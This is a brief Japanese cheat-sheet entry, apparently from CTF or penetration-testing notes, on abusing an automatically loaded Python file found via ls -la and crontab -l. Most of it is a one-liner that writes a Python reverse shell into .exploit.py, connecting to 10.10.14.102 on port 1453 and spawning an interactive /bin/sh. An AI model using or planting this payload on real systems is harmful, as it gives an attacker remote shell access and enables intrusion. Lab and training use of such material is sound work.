## 自動的に読み込まれる.pyを確認した場合
- 調査方法
  - `ls -la`で更新時間の確認
  - `crontab -l`で確認
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.102\",1453));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```
